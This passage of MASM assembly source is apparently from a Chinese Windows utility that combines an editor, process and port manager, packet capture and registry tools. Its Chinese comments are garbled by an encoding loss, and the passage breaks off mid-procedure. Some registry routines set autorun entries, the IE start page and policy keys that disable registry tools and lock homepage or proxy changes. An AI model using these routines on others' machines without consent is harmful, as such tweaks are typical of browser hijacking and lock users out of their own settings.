lpBufferRead             dd  ?
lpBufferWrite            dd  ?
lpMaxEndBuffer           dd  ?

lpHttpFilterFileName     db  'd:\ntkernl.bin',0
hHttpFilterFile          dd  ?   ;�ļ����
     
lpszErrNoMemory          db  '�ڴ�����ʧ�ܣ�',0
lpszHttpGet              db  'GET',0
lpszHttpPost             db  'POST',0
lpszHttp10               db  'HTTP/1.0',0
lpszFilterJpg            db  '.Jpg',0
lpszFilterJPG            db  '.JPG',0
lpszFilterjpg            db  '.jpg',0
lpszFilterGIF            db  '.GIF',0
lpszFilterGif            db  '.Gif',0
lpszFiltergif            db  '.gif',0

lpszReturn               db  0dh,0ah,0
lpszDoubleReturn         db  0dh,0ah,0dh,0ah,0
    
lpszHttpFilterFmt        db  '%04d��%02d��%02d�� %02d:%02d:%02d',20h,20h,0
lpszHttpFilterFmt2       db  '%s?%s',0 
lpszIPFilterFmt          db  '%02d:%02d:%02d  %d',0
lpszIPFilterFmt1         db  '%s:%d',0
lpszFilterFmt3           db  '%02x ',0
lpszFilterFmt4           db  '0000:%04x       ',0
lpszManyBlanks           db  '      ',0
lpszBlank                db  ' ',0
lpszSplit                db  '-',0
lpszScanFmt              db  '%02x',0
lpszHexArr               db  '0123456789ABCDEF',0


hHttpFilterTable         dd  ?
lpszFilterCol1           db  '˳��',0
lpszFilterCol2           db  'ʱ��',0
lpszFilterCol3           db  'ԴIP:�˿�',0
lpszFilterCol4           db  'Ŀ��IP:�˿�',0
lpszFilterCol5           db  '������',0
lpszFilterCol6           db  'Э������',0
lpszUDP                  db  'UDP',0
lpszTCP                  db  'TCP',0

lpszFilterStop           db  '��ֹ��׽',0
lpszFilterStart          db  '������׽',0
dwFilterStarted          dd  0
dwCurrentFilterProValue  dd  0
dwFilterProgressMin      dd  0
dwFilterProgressMax      dd  100
dwFilterLineIndex        dd  0

lpIndexArr               db  0,33h,66h,99h,0cch,0ffh
lpOldColor               db  0,0,0  ;��һ����ɫ
lpCurColor               db  0,0,0  ;��ǰ��ɫ
lpBackColor              db  0,0,0  ;����һ����ɫ�ı���
dwIndex                  db  0      ;��ɫ�ڵ�ɫ���ϵ����� 
lpNewValue               db  0,0    ;Ƶ��,����ֵ 
lpCompressDataBuffer     dd  0      ;��ȡ�������ָ��
lpsz4BmpFileName         db  'c:\4.bmp',0
lpszQLPicFile            db  'c:\1.qlg',0
lpQLHeader               QLHeader  <>


;SE_OBJECT_TYPE equ <SE_UNKNOWN_OBJECT_TYPE,SE_FILE_OBJECT,SE_SERVICE,SE_PRINTER,SE_REGISTRY_KEY,SE_LMSHARE,SE_KERNEL_OBJECT,SE_WINDOW_OBJECT,SE_DS_OBJECT,SE_DS_OBJECT_ALL,SE_PROVIDER_DEFINED_OBJECT,SE_WMIGUID_OBJECT,SE_REGISTRY_WOW64_32KEY>
;MULTIPLE_TRUSTEE_OPERATION equ <NO_MULTIPLE_TRUSTEE,TRUSTEE_IS_IMPERSONATE>
;TRUSTEE_TYPE equ <TRUSTEE_IS_UNKNOWN,TRUSTEE_IS_USER,TRUSTEE_IS_GROUP,TRUSTEE_IS_DOMAIN,TRUSTEE_IS_ALIAS,TRUSTEE_IS_WELL_KNOWN_GROUP,TRUSTEE_IS_DELETED,TRUSTEE_IS_INVALID,TRUSTEE_IS_COMPUTER>
;TRUSTEE_FORM equ <TRUSTEE_IS_SID,TRUSTEE_IS_NAME,TRUSTEE_BAD_FORM,TRUSTEE_IS_OBJECTS_AND_SID,TRUSTEE_IS_OBJECTS_AND_NAME>
;ACCESS_MODE equ <0,GRANT_ACCESS,SET_ACCESS,DENY_ACCESS,REVOKE_ACCESS,SET_AUDIT_SUCCESS,SET_AUDIT_FAILURE>
TRUSTEE STRUCT
	pMultipleTrustee  dd ?
	MultipleTrusteeOperation dd ?
	TrusteeForm   dd   ?
	TrusteeType   dd   ?
	ptstrName     dd   ?
TRUSTEE ENDS
EXPLICIT_ACCESS STRUCT
  grfAccessPermissions  dd          ?
  grfAccessMode         dd          ?
  grfInheritance        dd          ?
  Trustee               TRUSTEE   <>
EXPLICIT_ACCESS ENDS

osVersion        OSVERSIONINFO <>
world            SID  <>
p                dd ANYSIZE_ARRAY dup(?)
ea               EXPLICIT_ACCESS <> 
psd              SECURITY_DESCRIPTOR <>
pDacl            dd   ?
sockAddrName     sockaddr_in <>
dwSockLen        dd   ?
sockType         db   200 dup(0)
optlen           dd   4
szSockType       db   'NUL',0
                 db   'TCP',0
                 db   'UDP',0
                 db   'RAW',0
                 db   'RDM',0
                 db   'SEQ',0
szSockFmt        db   'PID=%d    %s��%d',0
szSockAscii      db   10 dup(0)
szPortProcessName  db  256 dup(0)
szPortProcessPath  db  256 dup(0)
szPortPID          db  10 dup(0)
szPort             db  10 dup(0)

;��Զ�̻����йص�����
magicPkt         magic_pkt  <>




;���ݶ�
    .data?
stStartUp	STARTUPINFO		<?>
stProcInfo	PROCESS_INFORMATION	<?> 
stOpenFileName	OPENFILENAME	<?>
stOSVersion     OSVERSIONINFO   <?> 
stSecurityp     SECURITY_ATTRIBUTES <?>
stPoint       POINT <?>
stRect        RECT  <?>
lpFindFileData  WIN32_FIND_DATA <?>
stLVC         LV_COLUMN <?>
stLVI         LV_ITEM   <?>
hiHandleInfo  HANDLEINFO  <?>
wsData        WSADATA <?>

inBuffer1   WAVEHDR <?>
inBuffer2   WAVEHDR <?>

pspStartup   PROPSHEETPAGE   <?>   ;ѡ�
pspIE        PROPSHEETPAGE   <?>
pspService   PROPSHEETPAGE   <?>
pspAutoLogin PROPSHEETPAGE   <?>
psh          PROPSHEETHEADER <?>


hInstance      dd   ?

hWinMain       dd   ?
hMenu          dd   ?
hSubMenu       dd   ? 
hWinToolbar    dd   ?   ;���ù�����
hWinPToolbar   dd   ?   ;���̹�������
hWinEdit       dd   ?   ;�ͻ��ı���
hWinEdit1      dd   ?   ;�ն������
hWinEdit2      dd   ?   ;���н��̵��ն������
hWinStatus     dd   ?
hFindFile      dd   ?

hProcessSnapshot  dd  ?
hModuleSnapshot   dd  ?
hModuleSnapshot1  dd  ? ;ģ������̹������õľ��  
hProcessSnapshot1 dd  ? ;ģ������̹������õľ��  
hOpenProcess      dd  ?
hClassListBox     dd  ?
hProcessListBox   dd  ?
hModuleListBox    dd  ?
hModuleShowList   dd  ?
hAutoLoginListBox dd  ?
hRegWndDlg        dd  ?  ;ϵͳ���ó������ѡ����ھ��
hToken            dd  ?
process_tkp       TOKEN_PRIVILEGES <>
shutdown_tkp      TOKEN_PRIVILEGES <>

hProcessWinTable    dd  ? ;�������ڱ����
hProcessModuleTable dd  ? ;ģ������̹��������
hRegStartupTable    dd  ? ;������Ŀ�����
hRegServiceTable    dd  ? ;ϵͳ��̨������Ŀ�����
hProcessPortTable   dd  ? ;������˿ڹ��������
hChatServerTable    dd  ? ;�Ự�����������

hRunThread     dd   ?
hIcon          dd   ?
hFindDialog    dd   ? ;���Ҿ��
hReplaceDialog dd   ? ;�滻���
hIconTerminate dd   ? ;��ֹ����ͼ����

hProcessPort     dd   ? ;�˿�����̹����õĽ��̾��
hMyHandle        dd   ?
hCurrentProcess  dd   ?



idFindMessage  dd   ?
szFindText     db   200 dup (?)
szReplaceText  db   200 dup (?)
szBuffer       db   512 dup (?)
szPlaceLine    db   512 dup (?)  ;��λ����������

szWaveInBuffer1  db   2048 dup(?)
szWaveInBuffer2  db   2048 dup(?)
szWaveInBuffer3  db   2048 dup(?)
szWaveInBuffer4  db   2048 dup(?)
bRecording       dd   ?
bEnding          dd   ?

szNewBuffer      db  2048 dup(?)
szClassNameBuf db   512 dup (?)  ;��Ҫ���Ĵ�С
szWndTextBuf   db   512 dup (?)  ;��Ҫ���Ĵ�С
dwFontColor    dd   ?
dwBackColor    dd   ?
dwFlag         dd   ?
dwConsoleFlag  dd   ?
dwDisIEAddr    dd   ?      ;��ֹ�û�����Ĭ����ҳ��ַ��־
dwDisProxy     dd   ?      ;��ֹ�û����Ĵ����־
dwDisProxySet  dd   ?      ;���Ĵ�����������ñ�־
dwDisAutoLogin dd   ?
dwRecordEnabled  dd  ?     ;¼���Ƿ�����
dwDataLength     dd  ?     ;ָ���������ݻ�������ָ��

dwWinIsHidden    dd  ?     ;��ǰѡ���Ĵ����Ƿ��Ѿ����أ���ʼΪ��ʾ
dwThisIsHidden   dd  ?     ;��ǰ�����Ƿ�����


dwCustColors   db   16 dup (?)
dwTrackPoint1  dd   ?   ;ָ���ļ�����չ��λ�õ�ָ��
dwTrackPoint2  dd   ?   ;
stFind         FINDREPLACE    <?>   ;�����滻
stLogFont      LOGFONT        <?>   ;����

hDlgKillInstance   dd ?
hDlgExecInstance   dd ?
hDlgModuleInstance dd ?


;��������
    .const
FINDMSGSTRING  db  'commdlg_FindReplace',0
szClassName    db  'QLTool',0
szDllEdit      db  'RichEd20.dll',0
lpszUser32lib  db  'user32',0
lpszSetLayeredWindow  db  'SetLayeredWindowAttributes',0
szClassEdit    db  'RichEdit20A',0
szCaptionMain  db  '���С����',0
szMenuHelp     db  '��������(&H)',0
szMenuAbout    db  '���ڱ�����(&A)...',0
szCaption      db  '�˵�ѡ��',0
szFormat       db  '��ѡ���˲˵����%08x',0
szFontFace     db  '����',0,0

szTitleFormat	db	'���С���� - [%s]',0
szNoName	db	'δ�������ļ�',0
szFilter1	db	'���Դ�ļ�(*.asm)',0,'*.asm',0,'�ı��ļ�(*.txt)',0,\
                        '*.txt',0,'��Դ�ļ�(*.rc)',0,'*.rc',0,'JAVAԴ�ļ�(*.java)',0,\
                        '*.java',0,'CԴ�ļ�(*.c)',0,'*.c',0,'��������(*.*)',0,'*.*',0
              db      0
szDefExt         db  'asm',0
szErrOpenFile    db  '�޷����ļ�!',0
szErrCreateFile  db  '�޷������ļ�!',0
szModify         db  '�ļ��Ѿ��޸ģ��Ƿ񱣴棿',0
szSaveCaption    db  '�����뱣����ļ���',0

szErrTerminate   db  '�޷�����ָ�����̣�������ϵͳ���̻�����Ȩ�޲���',0
szExecuteError   db  '�޷��������̣�',0
szNotFound       db  '�ַ���δ�ҵ�!',0
szFinished       db  '���滻��%d��',0
szFmtHexToDec    db  '%u',0
szSaveFile       db  'c:\console.txt',0
szSaveFile1      db  'c:\1',0
szWavPath        db  'c:\',0
szWavFileDate    db  '2006122334231220',0
szWavExt         db  '.wav',0

szColName1       db  '���ھ����',0
szColName2       db  '���������б�',0
szColName3       db  '��������',0

szMColName1      db  '����ID��',0
szMColName2      db  'ģ�����ַ',0
szMColName3      db  '����������',0

szRegColName1  db  '��������',0
szRegColName2  db  '���̶�Ӧ��·��',0
szRegColName3  db  '����λ��',0

szPortColName1 db  'PID',0
szPortColName2 db  '������',0
szPortColName3 db  '�˿�',0
szPortColName4 db  'Э��',0
szPortColName5 db  '���̶�Ӧ��·��',0

szRegServiceColName1  db  '��������',0
szRegServiceColName2  db  '��������',0
szRegServiceColName3  db  '����״̬',0
szRegServiceColName4  db  '��������λ��',0

sz1              db  '������:%d',0
sz2              db  '��:%10d     ��:%10d',0
szFormat0        db  '%02d:%02d:%02d',0
szFormat1        db  '���ֽ�����%d',0
szFormatWave     db  '%04d%02d%02d%02d%02d%02d',0
szFormatWaveFile db  '%s%s%s',0
szFormatWaveFile1 db  '%s%s',0
szRes            db  'rc /r %s',0
szCompile        db  'ml -c -coff %s',0
szLink           db  'link -subsystem:windows %s %s',0
szRun            db  '%s',0
szTopWinFmt      db  '%-8.8lx',0
szFmtProxyServer db  '%s:%s',0



szOut            db  '%d',0
szOut8           db  'ֵ�ǣ�%8x',0

stToolbar        equ  this byte
TBBUTTON	<0,IDM_NEW,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<1,IDM_OPEN,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<2,IDM_SAVE,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<0,0,TBSTATE_ENABLED,TBSTYLE_SEP,0,0,-1>
TBBUTTON	<3,IDM_PAGESETUP,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<4,IDM_PRINT,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<0,0,TBSTATE_ENABLED,TBSTYLE_SEP,0,0,-1>
TBBUTTON	<5,IDM_COPY,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<6,IDM_CUT,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<7,IDM_PASTE,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<8,IDM_UNDO,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<9,IDM_REDO,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<0,0,TBSTATE_ENABLED,TBSTYLE_SEP,0,0,-1>
TBBUTTON	<10,IDM_FIND,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<11,IDM_REPLACE,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<0,0,TBSTATE_ENABLED,TBSTYLE_SEP,0,0,-1>
TBBUTTON	<12,IDM_RES,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<13,IDM_COMPILE,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<14,IDM_LINK,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<15,IDM_RUN,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<16,IDM_COMPILEALL,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<0,0,TBSTATE_ENABLED,TBSTYLE_SEP,0,0,-1>
TBBUTTON	<17,IDM_HELP,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
NUM_BUTTONS      equ  23


stProcessToolbar        equ  this byte
TBBUTTON	<0,IDM_TERMINATE,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<1,IDM_EXECUTE,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<2,IDM_IPPORT,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<3,IDM_TOPWINDOW,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<4,IDM_MODULE,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<0,0,TBSTATE_ENABLED,TBSTYLE_SEP,0,0,-1>
TBBUTTON	<5,IDM_REGISTRY,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<0,0,TBSTATE_ENABLED,TBSTYLE_SEP,0,0,-1>
TBBUTTON	<6,IDM_SHUTDOWN,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<7,IDM_REBOOT,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<0,0,TBSTATE_ENABLED,TBSTYLE_SEP,0,0,-1>
TBBUTTON	<8,IDM_AUDIOSTART,TBSTATE_ENABLED,TBSTYLE_CHECK,0,0,-1>
TBBUTTON	<9,IDM_AUDIOSTOP,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
TBBUTTON	<10,IDM_AUDIOPLAY,TBSTATE_ENABLED,TBSTYLE_BUTTON,0,0,-1>
PROCESSNUM_BUTTONS      equ  14

;�����
    .code

;------------------------------------------------
; ע��������������
; ������  ����
; ����ʱ�䣺 2006.6.9
;------------------------------------------------

;---------------------------------------------------
; ��ѯ��ֵ
;  _lpszKey:�������     1234
;  _lpszValueName:��ֵ�� ""
;  _lpszValue:��ֵ���� 
;  _lpdwSize:���ݳ���
;  _lpdwType:��ֵ���� 
;  ���ص����ݴ����_lpszValue���崦���Ҵ�СΪ_lpdwSize
;---------------------------------------------------
_RegQueryValue  proc _lpszKey,_lpszValueName,_lpszValue,\
                     _lpdwSize,_lpdwType
        local @hKey,@dwReturn  ;@KeyΪ���ؼ������

        mov @dwReturn,-1
        invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,_lpszKey,NULL,\
               KEY_QUERY_VALUE,addr @hKey
        .if eax==ERROR_SUCCESS
           invoke RegQueryValueEx,@hKey,_lpszValueName,NULL,\
                  _lpdwType,_lpszValue,_lpdwSize
           mov @dwReturn,eax
           invoke RegCloseKey,@hKey
       .endif
       mov eax,@dwReturn
       ret
_RegQueryValue  endp

;---------------------------------------------------
; ���ü�ֵ
;  _lpszKey:�������  _lpszValueName:��ֵ��
;  _lpszValue:��ֵ���� _lpdwSize:���ݳ���
;  _lpdwType:��ֵ���� 
;---------------------------------------------------
_RegSetValue  proc _lpszKey,_lpszValueName,_lpszValue,\
                     _lpdwType,_lpdwSize
       local @hKey

       invoke RegCreateKey,HKEY_LOCAL_MACHINE,_lpszKey,addr @hKey
       .if eax==ERROR_SUCCESS
          invoke RegSetValueEx,@hKey,_lpszValueName,NULL,\
                 _lpdwType,_lpszValue,_lpdwSize
          invoke RegCloseKey,@hKey
      .endif
      ret
_RegSetValue   endp

;----------------------------------------------------
; �����Ӽ�
; _lpszKey:�������   _lpszSubKeyName:�Ӽ���
;----------------------------------------------------
_RegCreateKey  proc _lpszKey,_lpszSubKeyName
      local @hKey,@hSubKey,@dwDisp
 
      invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,_lpszKey,NULL,\
             KEY_CREATE_SUB_KEY,addr @hKey
      .if eax==ERROR_SUCCESS
          invoke RegCreateKeyEx,@hKey,_lpszSubKeyName,NULL,\
                 NULL,NULL,NULL,NULL,addr @hSubKey,addr @dwDisp
          invoke RegCloseKey,@hKey
          invoke RegCloseKey,@hSubKey
     .endif
     ret
_RegCreateKey  endp

;----------------------------------------------------
; ɾ����ֵ
; _lpszKey:�����   _lpszValueName:��ֵ��
;----------------------------------------------------
_RegDelValue  proc _lpszKey,_lpszValueName
     local @hKey
 
     invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,_lpszKey,NULL,\
           KEY_WRITE,addr @hKey
     .if eax==ERROR_SUCCESS
         invoke RegDeleteValue,@hKey,_lpszValueName
         invoke RegCloseKey,@hKey
     .endif
     ret
_RegDelValue  endp

;----------------------------------------------------
; ɾ���Ӽ�
; _lpszKey:�������  1234
; _lpszSubKeyName:�Ӽ���  "AutoRun1"  
;----------------------------------------------------
_RegDelSubKey  proc _lpszKey,_lpszSubKeyName
     local @hKey
 
     invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,_lpszKey,NULL,\
           KEY_WRITE,addr @hKey
     .if eax==ERROR_SUCCESS
         invoke RegDeleteKey,@hKey,_lpszSubKeyName
         invoke RegCloseKey,@hKey
     .endif
     ret
_RegDelSubKey  endp

;-----------------------------------------
; ����������Ϊ�Զ�����
; _lpszKeyAutoRun:�Զ��������ڵ�ע����·��  "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN"
; _lpszValueName:��ֵ����          "AutoRun1"
; _lpszValue:��ֵ���������·���� _dwSize:·������  "c:\program files\ql\qltools.exe"
; _dwFlag:������棬����ӣ�����Ǽ���ɾ��
;-----------------------------------------
_RegSetAutoRun  proc _lpszKeyAutoRun,_lpszValueName,_lpszValue,_dwSize,_dwFlag
    .if _dwFlag
       invoke _RegSetValue,_lpszKeyAutoRun,_lpszValueName,\
              _lpszValue,REG_SZ,_dwSize
    .else
       invoke _RegDelValue,_lpszKeyAutoRun,_lpszValueName
    .endif
    ret
_RegSetAutoRun  endp


;------------------------------------------------------------------------
; �����ļ�����
; _lpszExt:�ļ���չ��  ".test"
; _lpszExtDefKey:����չ�����Ӧ���Ӽ�  "testfile"
; _lpszOpenKey:���ļ����Ӽ�   "testfile\shell\open\command"
; _lpszOpenValue:���ļ�ʹ�õĳ���  "%SystemRoot%\system32\NOTEPAD.EXE %1"
;-------------------------------------------------------------------------
_RegSetExtRelative proc _lpszExt,_lpszExtDefKey,\
                       _lpszOpenKey,_lpszOpenValue,_dwSize1,_dwSize2
     local @hKey

     ;���ȴ�����չ����
     invoke RegCreateKey,HKEY_CLASSES_ROOT,_lpszExt,addr @hKey
     .if eax==ERROR_SUCCESS
        invoke RegSetValueEx,@hKey,NULL,NULL,\
               REG_SZ,_lpszExtDefKey,_dwSize1
        invoke RegCloseKey,@hKey
    .endif

     ;�ٴ�����չ������Ĭ�ϼ�
     invoke RegCreateKey,HKEY_CLASSES_ROOT,_lpszOpenKey,addr @hKey
     .if eax==ERROR_SUCCESS
        invoke RegSetValueEx,@hKey,NULL,NULL,\
               REG_EXPAND_SZ,_lpszOpenValue,_dwSize2
        invoke RegCloseKey,@hKey
    .endif
    ret
_RegSetExtRelative  endp

;------------------------------------------------------------------------
; ����IEĬ����ҳ��ַ
; _lpszAddr:Ĭ��WEB��ַ  "http://www.ljdx.com"
; _lpszMainPageKey:����ҳ��ַ���Ӧ���Ӽ�  "SOFTWARE\MICROSOFT\INTERNET EXPLORER\MAIN"
; _lpszMainPageName:����ҳ��ַ���Ӧ�ļ���   "Start Page"
;-------------------------------------------------------------------------
_RegSetMainPage  proc _lpszAddr,_lpszMainPageKey,_lpszMainPageName,_lpdwSize
    local @hKey

    invoke RegOpenKeyEx,HKEY_CURRENT_USER,_lpszMainPageKey,NULL,\
           KEY_SET_VALUE,addr @hKey
    .if eax==ERROR_SUCCESS
      invoke RegSetValueEx,@hKey,_lpszMainPageName,NULL,\
             REG_SZ,_lpszAddr,_lpdwSize
      invoke RegCloseKey,@hKey
    .endif
    ret
_RegSetMainPage  endp

;------------------------------------------------------------------------
; ע�����
; _lpszDisableRegKey:��ע��������Ӧ���Ӽ�  "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"
; _lpszDisableRegName:��ע��������Ӧ�ļ���   "DisableRegistryTools"
;-------------------------------------------------------------------------
_RegDisableReg  proc _lpszDisableRegKey,_lpszDisableRegName,_dwFlag
    local @hKey
    local @dwValue:dword

    invoke RegCreateKey,HKEY_CURRENT_USER,_lpszDisableRegKey,addr @hKey
    .if eax==ERROR_SUCCESS
       .if _dwFlag
          mov @dwValue,1
          invoke RegSetValueEx,@hKey,_lpszDisableRegName,NULL,\
                 REG_DWORD,addr @dwValue,4
       .else
          mov @dwValue,0
          invoke RegSetValueEx,@hKey,_lpszDisableRegName,NULL,\
                 REG_DWORD,addr @dwValue,4
       .endif
       invoke RegCloseKey,@hKey
    .endif
    ret
_RegDisableReg  endp


;------------------------------------------------------------------------
; ��ֹ�޸�Ĭ����ҳ��ַ
; _lpszDisUpdateAddrKey:���ֹ�޸�Ĭ����ҳ��ַ���Ӧ���Ӽ�  "HKEY_CURRENT_USERS\Software\Microsoft\Internet Explorer\Control Panel"
; _lpszDisUpdateAddrName:���ֹ�޸�Ĭ����ҳ��ַ���Ӧ�ļ���   "HomePage"
;-------------------------------------------------------------------------
_RegDisableAddr  proc _lpszDisUpdateAddrKey,_lpszDisUpdateAddrName,_dwFlag
    local @hKey
    local @dwValue:dword

    invoke RegCreateKey,HKEY_CURRENT_USER,_lpszDisUpdateAddrKey,addr @hKey
    .if eax==ERROR_SUCCESS
       .if _dwFlag
          mov @dwValue,0
          invoke RegSetValueEx,@hKey,_lpszDisUpdateAddrName,NULL,\
                 REG_DWORD,addr @dwValue,4
       .else
          mov @dwValue,1
          invoke RegSetValueEx,@hKey,_lpszDisUpdateAddrName,NULL,\
                 REG_DWORD,addr @dwValue,4
       .endif
       invoke RegCloseKey,@hKey
    .endif
    ret
_RegDisableAddr  endp

;------------------------------------------------------------------------
; ��ֹ�޸Ĵ�������
; _lpszKey:���ֹ�޸Ĵ������Ӧ���Ӽ�  "HKEY_CURRENT_USERS\Software\Microsoft\Internet Explorer\Control Panel"
; _lpszName:���ֹ�޸Ĵ������Ӧ�ļ���   "Proxy"
;-------------------------------------------------------------------------
_RegDisableProxy  proc _lpszKey,_lpszName,_dwFlag
    local @hKey
    local @dwValue:dword

    invoke RegCreateKey,HKEY_CURRENT_USER,_lpszKey,addr @hKey
    .if eax==ERROR_SUCCESS
       .if _dwFlag
          mov @dwValue,0
          invoke RegSetValueEx,@hKey,_lpszName,NULL,\
                 REG_DWORD,addr @dwValue,4
       .else
          mov @dwValue,1
          invoke RegSetValueEx,@hKey,_lpszName,NULL,\
                 REG_DWORD,addr @dwValue,4
       .endif
       invoke RegCloseKey,@hKey
    .endif
    ret
_RegDisableProxy  endp

;--------------------------
; ��10���Ʒ�ʽ��8���Ʒ�ʽ����Ļ����ʾָ��DWORD��ֵ
; _dwFlag=0��8���ƣ�1��10����
;--------------------------
showDW      proc  _dwValue,_dwFlag

            pushad
            invoke RtlZeroMemory,addr szBuffer,10
            .if _dwFlag
              invoke wsprintf,addr szBuffer,addr szOut,_dwValue
            .else
              invoke wsprintf,addr szBuffer,addr szOut8,_dwValue
            .endif
            invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            popad
            ret
showDW      endp

;--------------------------
; ��ʾ������ʾ��1
;--------------------------
showERR      proc  _lParam 

            pushad
            invoke MessageBox,NULL,_lParam,NULL,MB_OK
            popad
            ret
showERR      endp

;-----------------------------------
; ����ϵͳ�����ú���
; ��ָ���ڴ��е��ֽ�д���ļ�c:\1
;-----------------------------------
_MemToFile   proc _lpszMem,_dwSize
         local @hFile,@dwTemp

         ;���ڴ�д���ļ��Թ����
         invoke CreateFile,addr szSaveFile1,GENERIC_WRITE,\
                FILE_SHARE_READ,\
                0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
         mov @hFile,eax
         invoke WriteFile,@hFile,[_lpszMem],_dwSize,addr @dwTemp,NULL
         invoke CloseHandle,@hFile
         invoke showERR,addr lpszOne
         ret
_MemToFile  endp

;-------------------------
; ��ȡ����IP��ַ
;--------------------------
_getLocalIP  proc
            local @bRet
            local sin:sockaddr_in
            local @dwSinLen
            local localHostent:hostent
            local hAddr:in_addr
            local @lpHostent
            local @ip

            ;��ȡ����IP��ַ
            invoke gethostname,addr bufRecv,1024
            invoke gethostbyname,addr bufRecv
            mov @lpHostent,eax
            mov esi,@lpHostent
            assume esi:ptr hostent
            mov edi,[esi].h_list
            ;����ָ����������
            mov eax,dword ptr [edi]
            mov edi,eax
            mov eax,dword ptr [edi]
            mov @ip,eax
            invoke inet_ntoa,@ip
            invoke lstrcpy,addr lpszLocalIP,eax
            assume esi:nothing
            ret
_getLocalIP  endp


 
;-------------------------------------------
; ���ô���Ϊ͸��,_bAlpha��ֵ��0��255֮��
;-------------------------------------------
_setTransparency proc _hWnd:dword, _bAlpha:dword
   LOCAL @hLib:HANDLE
   LOCAL @SetLayeredWindowAttr:HANDLE
   LOCAL @WInfo:DWORD

   invoke LoadLibrary,addr lpszUser32lib
   mov @hLib,eax

   .if eax 
      invoke GetProcAddress, @hLib, addr lpszSetLayeredWindow
      mov @SetLayeredWindowAttr, eax
      .IF eax
	 invoke GetWindowLong,_hWnd,GWL_EXSTYLE
	 or eax, WS_EX_LAYERED
        invoke SetWindowLong, _hWnd, GWL_EXSTYLE, eax
        push LWA_ALPHA
        mov eax,_bAlpha
        push eax
        push NULL
        push _hWnd
        call [@SetLayeredWindowAttr]
      .endif
      invoke FreeLibrary,@hLib
   .endif

   ret
_setTransparency endp

;-----------------
; ����alȡ��ֵ,�㷨:
; �ֱ���0,33h,66h,99h,0cch,0ffh���,����ֵ��С�ķ���al������
;-----------------
_getNewValue    proc
     local @temp:byte
     local @temp1:byte
     local @temp2:byte
     local @ret:byte
     mov @temp,0ffh
     pushad
     mov esi,offset lpIndexArr
     mov @temp1,6
     mov @temp2,al
     .while TRUE
       .break .if @temp1==0
       mov al,@temp2
       mov bl,byte ptr [esi]


       mov dh,bl
       xor ah,ah
       xor bh,bh

       .if ax>bx
         sub ax,bx
         mov cx,ax
       .else
         sub bx,ax
         mov cx,bx
       .endif
       .if cl<@temp
         mov @temp,cl
         mov @ret,dh
       .endif
       inc esi
       dec @temp1
     .endw
     popad
     mov al,@ret
     ret
_getNewValue    endp

;--------------------
; ����ɫ�ڵ�ɫ����е�����ֵ���У�al,bl,cl�д���˸�ֵ
; �㷨:36*al+6*bl+cl+40
;--------------------
_getValueIndex  proc
     local @temp:byte
     local @temp1:byte
     pushad
     .if al==00h
        mov al,0
     .elseif al==33h
        mov al,1
     .elseif al==66h
        mov al,2
     .elseif al==99h
        mov al,3
     .elseif al==0cch
        mov al,4
     .elseif al==0ffh
        mov al,5
     .endif

     .if bl==00h
        mov bl,0
     .elseif bl==33h
        mov bl,1
     .elseif bl==66h
        mov bl,2
     .elseif bl==99h
        mov bl,3
     .elseif bl==0cch
        mov bl,4
     .elseif bl==0ffh
        mov bl,5
     .endif

     .if cl==00h
        mov cl,0
     .elseif cl==33h
        mov cl,1
     .elseif cl==66h
        mov cl,2
     .elseif cl==99h
        mov cl,3
     .elseif cl==0cch
        mov cl,4
     .elseif cl==0ffh
        mov cl,5
     .endif


     xor dx,dx
     xor ah,ah
     mov ch,36
     mul ch
     mov @temp1,al
     xor dx,dx
     xor ax,ax
     mov al,bl
     mov ch,6
     mul ch
     add al,@temp1
     add al,cl
     add al,40
     mov @temp,al
     popad
     mov al,@temp
     ret
_getValueIndex  endp

;------------------
; �Ƚ��ڴ������ֽ��Ƿ�һ��,һ���򷵻�1��ʾ��ɫ��һ����
;------------------
_colorCmp  proc
     local @temp
     pushad

     mov esi,offset lpCurColor
     mov edi,offset lpOldColor

     mov al,byte ptr [esi]
     mov bl,byte ptr [edi]
     .if al!=bl
       mov @temp,0
     .else
